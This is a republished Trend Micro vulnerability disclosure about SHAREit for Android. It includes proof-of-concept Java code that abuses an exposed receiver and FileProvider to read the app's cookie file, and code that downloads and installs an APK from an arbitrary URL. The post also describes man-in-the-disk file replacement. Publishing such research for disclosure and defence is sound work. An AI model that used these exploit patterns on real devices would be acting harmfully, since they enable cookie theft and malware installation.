---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-15_shareit-flaw-could-lead-to-remote-code-execution.md
original_filename: 2021-02-15_shareit-flaw-could-lead-to-remote-code-execution.md
title: SHAREit Flaw Could Lead to Remote Code Execution
category: documents
detected_topics:
- mobile-security
- command-injection
- supply-chain
- sso
- ssrf
- graphql
tags:
- imported
- documents
- mobile-security
- command-injection
- supply-chain
- sso
- ssrf
- graphql
language: en
raw_sha256: c077e6d996acadfd19938a37c4e788242468ae8025a5090e6506b7383f509545
text_sha256: 7562e99dbad9d72efd270afeb43aac4fca15a353d8d181ffa4fc876e51c62c4d
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# SHAREit Flaw Could Lead to Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-15_shareit-flaw-could-lead-to-remote-code-execution.md
- Source Type: markdown
- Detected Topics: mobile-security, command-injection, supply-chain, sso, ssrf, graphql
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `c077e6d996acadfd19938a37c4e788242468ae8025a5090e6506b7383f509545`
- Text SHA256: `7562e99dbad9d72efd270afeb43aac4fca15a353d8d181ffa4fc876e51c62c4d`


## Content

---
title: "SHAREit Flaw Could Lead to Remote Code Execution"
page_title: "SHAREit Flaw Could Lead to Remote Code Execution | Trend Micro (US)"
url: "https://www.trendmicro.com/en_us/research/21/b/shareit-flaw-could-lead-to-remote-code-execution.html"
final_url: "https://www.trendmicro.com/en_us/research/21/b/shareit-flaw-could-lead-to-remote-code-execution.html"
authors: ["Echo Duan", "Jesse Chang"]
programs: ["SHAREit"]
bugs: ["Android", "RCE", "MiTM", "Man-in-the-Disk attack", "Insecure intent", "Vulnerable Android content provider"]
publication_date: "2021-02-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3899
---

Cyber Threats

# SHAREit Flaw Could Lead to Remote Code Execution

We discovered vulnerabilities in the SHAREit application. These vulnerabilities can be abused to leak a user’s sensitive data, execute arbitrary code, and possibly lead to remote code execution. The app has over 1 billion downloads.

By: Echo Duan, Jesse Chang Feb 15, 2021 Read time:  ( words) 

[ ![Share](/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

_**Update as of Feb 23, 2021, 9:24 P.M. E.T.** : SHAREit has fixed the vulnerabilities mentioned in this blog entry. Users are advised to download the latest version of the app available in Google Play Store._

We discovered several vulnerabilities in the application named [SHAREit](https://play.google.com/store/apps/details?id=com.lenovo.anyshare.gps&hl=en_SG&gl=US). The vulnerabilities can be abused to leak a user’s sensitive data and execute arbitrary code with SHAREit permissions by using a malicious code or app. They can also potentially lead to Remote Code Execution (RCE). In the past, vulnerabilities that can be used to [download](https://cyware.com/news/critical-vulnerabilities-in-shareit-app-could-allow-attackers-to-download-arbitrary-files-in-victims-devices-c35a7937) and [steal](https://thehackernews.com/2019/02/shareit-android-hacking.html) files from users’ devices have also been associated with the app. While the app allows the transfer and download of various file types, such as Android Package (APK), the vulnerabilities related to these features are most likely unintended flaws.

SHAREit has over 1 billion downloads in [Google Play](https://play.google.com/store?utm_source=apac_med&utm_medium=hasem&utm_content=Jan0421&utm_campaign=Evergreen&pcampaignid=MKT-EDR-apac-ph-1003227-med-hasem-py-Evergreen-Jan0421-Text_Search_BKWS-BKWS%7cONSEM_kwid_43700035189602385_creativeid_406915427892_device_c&gclid=Cj0KCQiA3smABhCjARIsAKtrg6Jah74aaJ0e8pl7w_9bAlYsyH1dofNBcC6G6ay7dxr0v27c8fNZ7IYaAnwoEALw_wcB&gclsrc=aw.ds) and has been named as [one of the most downloaded applications](https://www.livemint.com/technology/apps/shareit-in-top-10-most-downloaded-mobile-apps-in-2019-report-11580810436540.html) in 2019. Google has been informed of these vulnerabilities. 

![Figure-1-SHAREit-download-page](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig1-SHAREit-download-page.png)

Figure 1. SHAREit download page in Google Play

![Figure-2-Additional-information-SHAREit](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig2-SHAREit-additional-info.png)

Figure 2. Additional information on the app shared in Google Play

**Vulnerability details**

We delved into the app’s code and found that it declares the broadcast receiver as “com.lenovo.anyshare.app.DefaultReceiver”. It receives the action "com.ushareit.package.action.install_completed" and Extra Intent then calls the startActivity() function.

![Figure-3-SHAREit-intent](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig3-SHAREit-code-snippet-intent-object.png)

Figure 3. Code snippet of how SHAREit receives an Intent object

We built a proof-of-concept (POC) code to inspect the vulnerability. If the following code is run via another app on the device, it will show my Activity.

![Figure-4-SHAREit-StartActivity](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig4-SHAREit-StartActivity.png)

Figure 4. Crafting an Intent to let SHAREit run a StartActivity() function

Any app can invoke this broadcast component. This shows arbitrary activities, including SHAREit’s internal (non-public) and external app activities.

SHAREit also defines a FileProvider. The developer behind this disabled the exported attribute via _android:exported="false"_ , but enabled the _android:grantUriPermissions="true"_ attribute. This indicates __ that any third-party entity can still gain temporary read/write access to the content provider's data.

Even worse, the developer specified a wide storage area root path. In this case, all files in the /data/data/<package> folder can be freely accessed.

The following code from our POC reads WebView cookies. This can also be used to write any files in the app’s data folder. In other words, it can be used to overwrite existing files in the SHAREit app.

public class MainActivity extends AppCompatActivity {

@Override

protected void onCreate(Bundle savedInstanceState) {

super.onCreate(savedInstanceState);

setContentView(R.layout.activity_main);

handleIntent(getIntent());

}

protected void onNewIntent(Intent intent) {

super.onNewIntent(intent);

Log.d("demo", "onNewIntent");

handleIntent(intent);

}

private void handleIntent(Intent i) {

if(!"evil".equals(i.getAction())) {

Intent next = new Intent("evil");

next.setClassName(getPackageName(), getClass().getCanonicalName());

next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION); next.setData(Uri.parse("content://com.lenovo.anyshare.gps.fileProvider/root/data/user/0/com.lenovo.anyshare.gps/app_webview/Cookies"));

Intent intent = new Intent("com.ushareit.package.action.install_completed");

intent.setClassName("com.lenovo.anyshare.gps", "com.lenovo.anyshare.app.DefaultReceiver");

intent.setPackage("com.lenovo.anyshare.gps");//this enable other app receive the intent.

intent.putExtra("android.content.pm.extra.STATUS",-1);

intent.putExtra("android.content.pm.extra.STATUS_MESSAGE","useless");

intent.putExtra("android.intent.extra.INTENT",next);

sendBroadcast(intent);

Log.e("demo", "send broadcast done");

}

else {

try {

Log.d("demo", "Got url: " + i.getData());

InputStream in = getContentResolver().openInputStream(i.getData());

if (in != null) {

String out = this.convertStreamToString(in);

Log.d("demo", "Read cookies: " + out);

}

}

catch (Throwable th) {

throw new RuntimeException(th);

}

}

}

We found that SHAREit generates vdex/odex files after dex2oat when first launched. The app then loads these files directly in subsequent running. An attacker may craft a fake vdex/odex file, then replace those files via the abovementioned vulnerability to perform code execution.

Also, we noticed that SHAREit has set up deep links using URL leading to specific features in the app. These contain features that can download and install any APK. 

![Figure-5-SHAREit-deeplink](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig5-SHAREit-deeplink-feature.png)

Figure 5. Code snippet showing SHAREit supporting the deep link feature

SHAREit declares a deep link feature that can download files from a URL that has the scheme of http/https and domain host that matches *.wshareit.com or gshare.cdn.shareitgames.com.

![Figure-6-SHAREit-deeplink-feature-installing-APK](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig6-SHAREit-deeplink-APK-installation.png)

Figure 6. Code snippet showing SHAREit supporting the deep link feature for installing APK

It also provides a feature that can install an APK with the file name suffix sapk. This feature can be used to install a malicious app; if such is the case, it will enable a limited RCE when the user clicks on a URL.

To verify whether the above functionality is available in the Google Chrome browser, we built an href attribute in HTML. When the user clicks this download URL, Chrome will call SHAREit to download the sapk from http://gshare.cdn.shareitgames.com. Since it supports the HTTP protocol, this sapk can be replaced by simulating a [man-in-the-middle (MitM)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/infosec-guide-defending-against-man-in-the-middle-attacks) attack.

![Figure-7-Download-spk](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig7-SHAREit.PNG)

Figure 7. Code snippet showing the download of sapk

By doing so, the Malware.sapk (a sample file used here to represent malware) will be downloaded into the /sdcard/SHAREit/download/apps directory silently. To simulate this, we constructed an href.

![Figure-8-APK-installation](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig8-SHAREit.PNG)

Figure 8. Code snippet showing the installation of APK

However, the sapk installation notification does not pop-up. To check whether this intent can be received by SHAREit, we tried to send it to the app directly by using this code:

try {

Intent mytest = Intent.parseUri("intent:///sdcard/SHAREit/download/apps/Malware.sapk #Intent;action=android.intent.action.VIEW;scheme=content;package=com.lenovo.anyshare.gps;type=text/plain;end", 1);

Log.e("test", "intent: " + mytest);

this.startActivityIfNeeded(mytest, -1);

} catch (URISyntaxException e) {

Log.e("test", "url syntax error:" + e);

}

The result shows that SHAREit can accept this Intent and pop-up APK installation UI.

The reason for the unsuccessful operation through Chrome is that the browser intercepts this request. By reverse engineering, we found out that Chrome did discard content/file scheme Intent due to security concerns.

Even if the download and installation of APK by Chrome deep link were not successful, the same attack can still be performed by downloading the APK from an arbitrary URL and Install APK under an arbitrary path by using this code via a malicious app locally:

Intent next = new Intent();

next.setClassName("com.lenovo.anyshare.gps", "com.lenovo.anyshare.scheme.SchemeFilterActivity");

next.setData(Uri.parse("http://10.64.100.51:8080/ base.sapk")); // Arbitrary URL

startActivity(next);

Intent next1 = new Intent();

next1.setClassName("com.lenovo.anyshare.gps", "com.ushareit.ads.download.SapkInstallerActivity");

next1.setData(Uri.parse("content:///sdcard/SHAREit/download/apps/base.sapk/base.apk"));// Arbitrary path

startActivity(next1);

SHAREit is also susceptible to a [man-in-the-disk (MITD) attack](https://searchsecurity.techtarget.com/definition/man-in-the-disk-MITD-attack). This Is because when a user downloads the app in the download center, it goes to the directory as shown in the sample code. The folder is an external directory, which means any app can access it with SDcard write permission.

![Figure-9-Directory-download](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig9-Code-snippet-directory-download.png)

Figure 9. Code snippet showing download to a directory

To illustrate, we manually copied Twitter.apk in the code to replace it with a fake file of the same name. As a result, a pop-up of the fake Twitter app will appear on the main screen of the SHAREit app.

![Figure-10-Fake-twitter-app](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig-10-pop-up-fake-app.png)

Figure 10. A pop-up from the fake Twitter app created to test the vulnerability

Reopening the SHAREit app will cause the fake Twitter app to appear on the screen again to prompt the user to install it.

![Figure-11-Fake-Twitter-app-download](/content/dam/trendmicro/global/en/research/21/b/shareit-flaw-could-lead-to-remote-code-execution/Fig-11-DL-prompt.png)

Figure 11. Download prompt from the fake Twitter app created to test the vulnerability

Upon tapping the install button, the fake app will be installed successfully and opened automatically. This will show another system notification pop-up.

The external directory also has some directories that can be used to steal and replace files:  
  

bullhead:/sdcard/SHAREit/download $ ls

apps audios files pictures videos

bullhead:/sdcard/SHAREit/download $

SHAREit is a game center that provides game apps that can be downloaded by the configuration file GameSettings.xml located in the com.lenovo.anyshare.gps/shared_prefs directory.

For example, the xml content contains the link hxxp://cdn2[.]gamecenter[.]run/apk/extension/Av5PyuNY[.]apk .

Looking through this file shows that the download URLs are not only from Google Play, but also from other vendors. Most of the URLs use the HTTP protocol, and it is very dangerous to transfer data without encryption as these can be tampered with by a MitM attacker.

**Recommendations**

Security should be a top consideration for app developers, enterprises, and users alike. For safe mobile app use, we recommend regularly updating and patching mobile operating systems and the app themselves. Users should also keep themselves informed by reading reviews and articles about the apps they download.

Tags

[Research](/en_us/research.html?category=trend-micro-research:article-type/research) | [Mobile](/en_us/research.html?category=trend-micro-research:environments/mobile) | [Articles, News, Reports](/en_us/research.html?category=trend-micro-research:medium/article) | [Cyber Threats](/en_us/research.html?category=trend-micro-research:threats/cyber-threats)

###  Authors 

  * Echo Duan

Mobile Threats Analyst

  * Jesse Chang

Mobile Threats Analyst

[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ From Langflow to Monero: Inside CVE-2026-33017 Cryptominer ](/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html)
  * [ PeopleSoft PeopleTools Pre-Authentication RCE: A PSIGW SSRF Chain That Executes Inside the JVM ](/en_us/research/26/f/PeopleTools.html)
  * [ Router Roulette: Cybercriminals and Nation-States Sharing Compromised Networks ](/en_us/research/24/e/router-roulette.html)

[ See all articles ](/en_us/research.html)

[ ](/en_us/research.html)
